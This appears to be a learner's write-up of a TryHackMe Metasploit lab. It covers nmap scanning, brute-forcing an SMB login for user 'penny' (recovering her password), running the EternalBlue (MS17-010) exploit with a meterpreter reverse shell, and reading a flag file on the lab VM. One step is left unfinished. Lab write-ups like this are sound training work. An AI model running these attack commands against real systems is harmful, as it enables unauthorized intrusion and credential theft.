*** Scanning Practicals ***

> After launching the THM AttackBox, i then ran Metasploit by inputting "msfconsole," then "enter," and was given my first practical which was to find out how many open ports they were on the target system. To do
this i input "nmap -sS 10.10.96.65," then "enter." The reason why i used the nmap command was because it is more faster to conduct scans on a target system within Metasploit.

> I then had to figure the NETBIOS name by using the relevant scanner. To do this
>

> I then had to figure out what was running on port 8000. To do this i inputted the command "nmap -sV 10.10.183.249," then "enter" which displayed "webfs/1.21" on port 8000.

> Next I had to figure out "penny" user's SMB password. To do this i had to implement the wordlist that was mentioned in the previous task and then switch to the "smb_login" module by inputting the command
"search smb_login," then "enter," then "use 0."

> I then had to set the RHOSTS to the target machine's ip address by inputting "set RHOSTS 10.10.135.248," then "enter."
> <img width="608" height="75" alt="meta11" src="https://github.com/user-attachments/assets/d1033556-3120-4de8-8db5-3f8ee3653407" />

> Then had to set the pass_file module to the wordlist given in the previous task by inputting "set pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt," then "enter," then "show options" to make
sure it was set correctly.

> Then had to set smbuser to "penny" by inputting "set smbuser penny," then "enter," then "show options" to confirm it was set.

> Finally, i had to run the smb_login module to retrieve "penny" user's password by inputting "run," then "enter," and got the password "leo1234."

*** Vulnerability Scanning ***

> I was then given a practical to find out who wrote the module that allows us to check SMTP servers for open relay. To do this i input "search smtp," then "enter," and was given a list of modules that fell under
"smtp."

> I then found the specific module that allows us to check the SMTP servers for open relay which was module 39.

> So to figure out who wrote the module i inputted "use 39," then "enter," and saw it was written by "Campbell Murray."

*** Exploitation ***

> Given a practical to exploit one of the critical vulnerabilities on the target VM. To do this i had to first switch to the module "windows/smb/ms17_010_eternalblue" by inputting
"use windows/smb/ms17_010_eternalblue," then "enter" which ended up just defaulting to "windows/x64/meterpreter/reverse_tcp" because no payload was configured.

> I then had to set the RHOSTS to the target VM's ip address by inputting "set RHOSTS 10.201.58.191," then "enter."
> <img width="690" height="58" alt="meta19" src="https://github.com/user-attachments/assets/5bfe23bb-5eba-43cb-a75e-15154aef155d" />

> Then I finally input "run" to exploit the critical vulnerability on the target VM and it was confirmed that the host was vulnerable to MS17-010.
> <img width="1165" height="552" alt="meta20" src="https://github.com/user-attachments/assets/c6f4133e-1397-41bd-a213-06402abca5ce" />

> Next practical was to figure out the contents of the flag.txt file which was located in directory "C:\Users\Jon\Documents\." To do this i had to background the metepreter session #1 by inputting the "background"
command, then "enter."
> <img width="1158" height="192" alt="meta21" src="https://github.com/user-attachments/assets/83612258-01ca-4dd8-8ef1-c606cfe9459e" />

> I then had to interact with the session i backgrounded by inputting "session -i 1," then "cd /" to change the directory to the "C:\" directory

> Then to find the "flag.txt" file within the "C:\" directory i inputted "search -f flag.txt," then "enter," and confirmed that it was located specifically in "C:\Users\Jon\Documents\" directory.

> So to finally display the contents of the "flag.txt" file i inputted "cat /Users/Jon/Documents/flag.txt," then "enter" and retrieved "THM-5455554845."
